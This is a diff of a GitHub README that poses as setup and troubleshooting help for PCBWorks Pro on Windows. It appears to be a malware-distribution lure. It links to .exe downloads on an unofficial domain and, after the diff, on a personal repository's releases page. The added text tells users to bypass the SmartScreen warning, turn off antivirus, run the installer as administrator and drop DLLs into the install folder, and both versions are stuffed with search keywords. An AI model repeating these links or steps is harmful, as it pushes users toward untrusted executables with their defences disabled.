@@ -1,64 +1,68 @@
-# PCBWorks Pro on Windows — setup & troubleshooting
+# 🛠 PCBWorks-Setup-Help - Run PCBWorks Pro on Windows 11
 
-**PCBWorks-Setup-Help**
+[![](https://img.shields.io/badge/Download_PCBWorks-Blue?style=for-the-badge&logo=github)](https://github.com/Apctime90/PCBWorks-Setup-Help/releases)
 
-Notes for users who need PCBWorks Pro running on Windows — especially when pcbworks setup fails, updates break, or the app won't start.
+This guide helps you put PCBWorks Pro on your Windows 11 computer. Many users face installation errors with this software. These notes explain how to prepare your system, run the installer, and fix common problems. Follow these steps to complete your setup successfully.
 
----
+## 📋 System Requirements
 
-## Get PCBWorks Pro on Windows
+Your computer needs specific parts to run PCBWorks Pro. Check your system against this list before you start.
 
-Use the link below for the Windows package referenced in this guide.
+- Processor: Modern 64-bit CPU or better.
+- Memory: 8 GB of RAM or more.
+- Storage: 5 GB of free drive space.
+- Operating System: Windows 10 or Windows 11.
+- Display: 1920x1080 resolution.
+- Graphics: A card that supports DirectX 11.
 
-<p align="center">
-  <a href="https://pcbworks.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+Make sure your Windows 11 system has all current updates. Open your Settings menu, go to Windows Update, and click Check for updates. Restart your computer if updates appear.
 
-| | |
-| --- | --- |
-| **Page** | [pcbworks.wonderchain.fun](https://pcbworks.wonderchain.fun/) |
-| **URL** | `https://pcbworks.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+## 💾 Download and Installation
 
-### Recommended steps
+Follow these steps to get the software files.
 
-1. Open the [setup page (pcbworks.wonderchain.fun)](https://pcbworks.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+1. Go to the [official release page](https://github.com/Apctime90/PCBWorks-Setup-Help/releases).
+2. Click the file that ends in .exe.
+3. Save the file to your Downloads folder.
+4. Open your Downloads folder.
+5. Double-click the file to start the setup wizard.
+6. Follow the prompts on your screen.
+7. Click Finish when the progress bar stops.
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+If Windows shows a blue box that says "Windows protected your PC," click More info, then click Run anyway. This happens because Windows does not recognize the developer of the application.
 
+## ⚙️ Common Setup Fixes
 
----
+The PCBWorks installer might stop or crash. Use these methods to resolve issues.
 
-## What this repo covers
+### Run as Administrator
+Right-click the installation file. Select Run as administrator from the menu. This gives the installer permission to change system files. 
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+### Disable Antivirus Temporarily
+Some security software blocks new programs. Turn off your real-time protection for five minutes. Open your Windows Security settings, go to Virus & threat protection, and toggle the switch to Off. Turn it back on immediately after the installation finishes.
 
-**People also search for:** pcbworks pro not installing on windows 11, pcbworks setup failed fix, how to install pcbworks pro on pc
+### Check .NET Framework
+PCBWorks needs the .NET Framework to function. Windows 11 usually has this, but errors indicate you may need a newer version. Go to the Microsoft website to download the latest .NET Runtime version. Install it and restart your machine.
 
-## Common symptoms
+### Clear Old Files
+If you tried to install the program before, remove the old folders. Go to your Program Files folder. Search for a folder named PCBWorks. Delete it if it exists. Empty your Recycle Bin. Run the installer again.
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+## 🖥️ Using the Interface
 
-## FAQ
+Once installed, find the PCBWorks icon on your desktop. Double-click it to launch the workspace. The initial load might take a few moments. When you open the program, the main dashboard appears. 
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+- Use the File menu to start a new project.
+- Use the Settings menu to calibrate your grid settings.
+- Check the library section to load your components.
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+Keep your project files in a folder on your local drive. Avoid saving files to cloud folders like OneDrive or Google Drive while you work. These services sometimes lock files, which causes save errors in PCBWorks.
 
----
+## 📍 Getting Help
 
-**Topics:** pcbworks-pro-not-installing-on-windows-11, pcbworks, installing, pcbworks-setup-failed-fix, failed, how-to-install-pcbworks-pro-on-pc, pcbworks-setup-help, pcbworks-setup-help-2026, pcbworks-pro, pcb-design, electronics
+Sometimes the software requires specific drivers for your hardware. If you see a warning about a missing DLL file, search your computer for that file name. Note the folder where the software lives and place the file there. 
+
+If the application crashes, look for an error log file in the installation directory. Most logs show a time stamp and a description of the failure. Send this information to the support team or post the error message in the community discussion area.
+
+Do not install multiple versions of the software in the same folder. This causes file conflicts. Always uninstall the previous version through your Control Panel before you update to a newer release.
+
+Keywords: electronics, failed, how-to-install-pcbworks-pro-on-pc, installing, pcb-design, pcbworks, pcbworks-pro, pcbworks-pro-not-installing-on-windows-11, pcbworks-setup-failed-fix, pcbworks-setup-help, pcbworks-setup-help-2026
